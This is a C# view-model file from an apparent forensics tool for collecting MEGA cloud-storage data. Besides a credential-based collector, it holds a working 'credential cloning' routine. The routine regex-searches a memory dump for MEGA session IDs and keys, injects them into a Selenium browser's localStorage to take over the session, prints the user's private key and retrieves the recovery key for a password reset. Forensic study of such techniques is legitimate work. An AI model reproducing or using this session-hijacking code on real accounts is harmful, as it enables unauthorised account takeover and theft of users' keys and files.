using DICE.Common;
using DevExpress.Mvvm.POCO;
using System;
using System.Windows;
using DevExpress.Mvvm;
using DICE.Modules.Views.CollectConfigViews;
using DICE.Modules.Views.Cloud;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;
using System.Linq;
using DICE.Modules.ViewModels.Cloud.Mega;
using log4net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Windows.Forms;
using MessageBox = System.Windows.Forms.MessageBox;
using System.Net.NetworkInformation;
using System.Security.Policy;
using static Community.CsharpSqlite.Sqlite3;

namespace DICE.Modules.ViewModels
{
	public class InLabViewModel : ViewModelBase, IDocumentModule
	{
		private static readonly ILog logger = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

		public string al_i { get; set; }
		public string al_p { get; set; }

		public string MegaInLabButtonContent1
		{
			get { return GetValue<string>(nameof(MegaInLabButtonContent1)); }
			set { SetValue(value, nameof(MegaInLabButtonContent1)); }
		}
		public string MegaInLabButtonContent2
		{
			get { return GetValue<string>(nameof(MegaInLabButtonContent2)); }
			set { SetValue(value, nameof(MegaInLabButtonContent2)); }
		}

		public Boolean _ConfigButtonEnabled = true;
		public Boolean ConfigButtonEnabled
		{
			get
			{
				if (_ConfigButtonEnabled == false)
				{
					return false;
				}
				else return true;
			}
		}

		public string logInLabTextEdit
		{
			get { return GetValue<string>(nameof(logInLabTextEdit)); }
			set { SetValue(value, nameof(logInLabTextEdit)); }
		}
		public bool logInLabIsReadOnly
		{
			get { return GetValue<bool>(nameof(logInLabIsReadOnly)); }
			set { SetValue(value, nameof(logInLabIsReadOnly)); }
		}
		public string Caption { get; private set; }
		public virtual bool IsActive { get; set; }
		public bool IsParsed { get; set; }
		public static InLabViewModel Create(string caption)
		{
			return ViewModelSource.Create(() => new InLabViewModel()
			{
				Caption = caption,
			});
		}
		protected InLabViewModel()
		{
			MegaInLabButtonContent1 = "USER AUTHENTICATION";
			MegaInLabButtonContent2 = "CREDENTIAL CLONING USING MEMORY";
			IsParsed = false;
		}

		private void log(string logMsg)
		{
			logInLabIsReadOnly = false;
			logInLabTextEdit += logMsg + "\n";
			logInLabIsReadOnly = true;
		}

		public void validCheckButtonClick()
		{
			return;
		}

		public void ConfigButtonClick(object param)
		{
			switch (param.ToString())
			{
				case "Mega1":
					logger.Info("Start DICE-M: User Authentication!");
					MegaConfig1();
					break;
				case "Mega2":					
					logger.Info("Start DICE-M: Credential Cloning sing Memory!");
					MegaConfig2();
					break;
				default:
					break;
			}
		}

		public static List<JToken> mobj;
		public static List<JToken> mobj_fav;
		public static IEnumerable<INode> mnodes;
		public static string mRootId;
		public static string mRubbishId;
		public static string mInboxId;
		public static string mFavoriteId;
		public static string[] mSharedId = new string[100];

		public static readonly ILog Mega_Log = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

		private static void FindPath(JToken item, Dictionary<string, List<JToken>> relationships, Dictionary<string, string> paths, string parentPath)
		{
			string name = (string)item["Name"];
			string id = (string)item["Id"];

			if (string.IsNullOrEmpty(parentPath))
			{
				paths.Add(id, name);
				return;
			}

			string path = parentPath + "/" + name;

			paths.Add(id, path);

			if (relationships.ContainsKey(id))
			{
				foreach (var child in relationships[id])
				{
					FindPath(child, relationships, paths, path);
				}
			}
		}

		private void SearchRegexInMemoryFile(string filePath)
		{
			string[] patternsMega = {
				@"https:\/\/g\.api\.mega\.co\.nz\/(?:wsc\/[a-zA-Z0-9-]{43}\?|cs\?id=-\d+&|sc\?id=-\d+&).*?sid=([a-zA-Z0-9\-_]{58})",
				@"https:\/\/mega\.nz..k\+.(\[(?:-?\d{4,},){3}-?\d{4,}\])"
			};

			var result = FindFindAll(filePath, patternsMega);

			var combination = CreateCombination(result);

			Console.WriteLine("\n========= Values for Cloning attack Starts =========\n");
			foreach (var tuple in combination)
			{
				Console.WriteLine($"sid: {tuple.Item1}, k: {tuple.Item2}");
			}
			Console.WriteLine("\n========== Values for Cloning attack Ends ==========\n");

			LoginMega(combination);
		}

		static Dictionary<string, List<string>> FindFindAll(string filePath, string[] patterns)
		{
			var matches = patterns.ToDictionary(pattern => pattern, _ => new List<string>());

			using (var driver = new ChromeDriver())
			{
				long offset = 0;
				const int chunkSize = 1024 * 1024 * 1024;

				while (true)
				{
					using (var fileStream = new System.IO.FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
					{
						fileStream.Seek(offset, System.IO.SeekOrigin.Begin);
						var buffer = new byte[chunkSize];
						var bytesRead = fileStream.Read(buffer, 0, buffer.Length);
						var chunk = System.Text.Encoding.Default.GetString(buffer, 0, bytesRead);

						if (string.IsNullOrEmpty(chunk))
						{
							break;
						}

						foreach (var pattern in patterns)
						{
							var patternMatches = System.Text.RegularExpressions.Regex.Matches(chunk, pattern)
								.Cast<System.Text.RegularExpressions.Match>()
							   .Select(m => m.Groups[1].Value);

							foreach (var match in patternMatches)
							{
								if (!matches[pattern].Contains(match))
								{
									matches[pattern].Add(match);
									Console.WriteLine($"Found match for {pattern}: {match}");
								}
							}
						}
						offset += chunk.Length;
						Console.WriteLine($"Processed: {offset} bytes");
					}
				}
			}
			return matches;
		}

		static List<Tuple<string, string>> CreateCombination(Dictionary<string, List<string>> result)
		{
			Console.WriteLine("\n=============== Search Result Starts ===============\n");

			var combination = new List<Tuple<string, string>>();
			var patternValueMap = new Dictionary<string, List<string>>();

			foreach (var kvp in result)
			{
				if (kvp.Value.Any())
				{
					Console.WriteLine($"\nPattern: {kvp.Key}");
					foreach (var v in kvp.Value)
					{
						Console.WriteLine(v);
					}

					patternValueMap[kvp.Key] = kvp.Value;
				}
				else
				{
					MessageBox.Show($"Value Not Found :(\nNot Found Pattern: {kvp.Key}", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
					Environment.Exit(-1);
				}
			}

			var pattern1 = patternValueMap.Keys.ElementAt(0);
			var pattern2 = patternValueMap.Keys.ElementAt(1);

			foreach (var value1 in patternValueMap[pattern1])
			{
				foreach (var value2 in patternValueMap[pattern2])
				{
					combination.Add(Tuple.Create(value1, value2));
				}
			}
			Console.WriteLine("\n================ Search Result Ends ================\n");		

			return combination;
		}

		static void LaunchWeb(string sid, string k)
		{
			string url_login = "https://mega.nz/login";
			using (var driver = new ChromeDriver())
			{
				driver.Navigate().GoToUrl(url_login);
				Thread.Sleep(3000);

				IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
				js.ExecuteScript($"localStorage.setItem('sid', '{sid}');");
				js.ExecuteScript($"localStorage.setItem('k', '{k}');");

				driver.Navigate().Refresh();

				while (true)
				{
					Thread.Sleep(1000);
					try
					{
						if (driver.WindowHandles.Count == 0)
						{
							break;
						}
					}
					catch
					{
						break;
					}
				}
			}
		}

		static void LoginMega(List<Tuple<string, string>> dataList)
		{
			string url_login = "https://mega.nz/login";
			string url_keybackup = "https://mega.nz/keybackup";

			string finalsid = null;
			string finalk = null;

			using (var driver = new ChromeDriver())
			{
				driver.Navigate().GoToUrl(url_login);
				Thread.Sleep(3000);

				Console.WriteLine("Start finding valid keys...");

				bool foundValidKey = false;

				foreach (var data in dataList)
				{
					var sid = data.Item1;
					var k = data.Item2;

					Console.WriteLine($"Try: {sid}, {k}");

					IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
					js.ExecuteScript($"localStorage.setItem('sid', '{sid}');");
					js.ExecuteScript($"localStorage.setItem('k', '{k}');");

					driver.Navigate().Refresh();
					Thread.Sleep(2000);

					var handleValue = (string)js.ExecuteScript("return localStorage.getItem('handle');");

					if (!string.IsNullOrEmpty(handleValue))
					{
						Console.WriteLine($"Found additional info: User ID would be {handleValue}");

						var privkValue = (string)js.ExecuteScript("return localStorage.getItem('privk');");
						if (!string.IsNullOrEmpty(privkValue))
						{
							Console.WriteLine($"I've found additional info: User's Private Key would be {privkValue}");
						}
						else
						{
							Console.WriteLine("Private Key Not Found");
						}

						Console.WriteLine($"Finally You've got the keys!: {sid}, {k}");
						foundValidKey = true;
						finalsid = sid;
						finalk = k;

						DialogResult result = MessageBox.Show("Do you want to reset the password using the Recovery Key?", "Information", MessageBoxButtons.YesNo, MessageBoxIcon.Information);

						if (result == DialogResult.Yes)
						{
							driver.Navigate().GoToUrl(url_keybackup);
							Thread.Sleep(2000);

							var backupKeyInput = driver.FindElement(By.Id("backup_keyinput"));

							if (backupKeyInput != null)
							{
								var res = backupKeyInput.GetAttribute("value");
								Console.WriteLine($"Recovery Key: {res}");
							}
							else
							{
								Console.WriteLine("Recovery Key not found :(");
							}
							break;
						}
					}
					else
					{
						Console.WriteLine("Key Invalid :( Clearing all values...");
						js.ExecuteScript("localStorage.clear();");
					}
				}
				if (!foundValidKey)
				{
					driver.Quit();
					MessageBox.Show("Key Invalid :(\nExit the tool.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
				}
				else
				{
					Console.WriteLine("You can navigate MEGA Cloud Storage Freely!");
					LaunchWeb(finalsid, finalk);										
				}
			}
		}


		private void MegaConfig2()
		{
			if (MegaInLabButtonContent2 == "CREDENTIAL CLONING USING MEMORY")
			{
				MemoryInputMegaView megaMemoryInput = new MemoryInputMegaView
				{
					WindowStartupLocation = WindowStartupLocation.CenterScreen
				};
				megaMemoryInput.ShowDialog();

				string mempath = megaMemoryInput.FilePathTextBox.Text;
				if (mempath != null)
				{
					SearchRegexInMemoryFile(mempath);
				}
			}
		}

		private void MegaConfig1()
		{
			if (MegaInLabButtonContent1 == "RUN")
			{
				MegaManager mm = new MegaManager();

				mm.Login(CredentialInputMegaView.al_i, CredentialInputMegaView.al_p);

				if (mm.IsLoggedIn == true)
				{
					Mega_Log.Info("Success Mega Login");

					int i = 0;

					Console.WriteLine("\n★ Login Succeed");
					Console.WriteLine("★ Quota Infromation\n" + ((mm.GetAccountInformation().UsedQuota / 1024f) / 1024f) + " MB / " + ((mm.GetAccountInformation().TotalQuota / 1024f) / 1024f) + " MB");
					Console.WriteLine("★ Metrics Information (NodeId : FoldersCount : FilesCount : BytesUsed)");

					foreach (var metric in mm.GetAccountInformation().Metrics)
					{
						if (i == 0) mRootId = metric.NodeId;
						else if (i == 1) mInboxId = metric.NodeId;
						else if (i == 2) mRubbishId = metric.NodeId;
						else if (i >= 3)
						{
							mSharedId[i - 3] = metric.NodeId.ToString();
						}
						i++;
						Console.WriteLine($"{metric.NodeId}: {metric.FoldersCount}: {metric.FilesCount}: {metric.BytesUsed}");
					}
					Console.WriteLine("\n");
				}
				else
				{
					Mega_Log.Info("Fail Mega Login");
					throw new Exception("\n★ Login Failed");
				}

				mnodes = mm.GetNodes();

				// INodes to JToken
				mobj = MegaManager.DisplayNodes(mnodes);

				// Add File Hash attribute
				mobj = mm.AddFileHash(mnodes, mobj);

				// Add SharedUserId, SharingType to Shared File
				mm.AddSharedUser(mobj);

				// Matching Other users' ID and email
				mm.AddUserEmail(mobj);

				// Add Location in Cloud to metadata
				mm.AddLocation(mobj);

				// Create mobj_fav
				mobj_fav = mobj;
				mobj_fav = mobj_fav.Where(jt => jt["Favorite"] != null && jt["Favorite"].ToString() == "1").ToList();
				foreach (JToken favorite in mobj_fav)
				{
					Console.WriteLine(favorite.ToString());
				}

				// Add DownloadURL attribute
				mm.AddDownloadUrl(mnodes, mobj);
				Mega_Log.Info("Success collecting file list");

				// Collect THUMBNAILs
				mm.GetThumbnails(mnodes);
				Mega_Log.Info("Success collecting thumbnails");

				// Add History
				mm.AddFileHistory(mobj);
				Mega_Log.Info("Success collecting file history");

				MegaMainWindow MegaMain = new MegaMainWindow
				{
					WindowStartupLocation = WindowStartupLocation.CenterScreen
				};
				MegaMain.Show();
			}
			else if (MegaInLabButtonContent1 == "USER AUTHENTICATION")
			{
				CredentialInputMegaView megaCredentialInput = new CredentialInputMegaView
				{
					WindowStartupLocation = WindowStartupLocation.CenterScreen
				};
				megaCredentialInput.ShowDialog();
				MegaInLabButtonContent1 = "RUN";
			}
		}
	}
}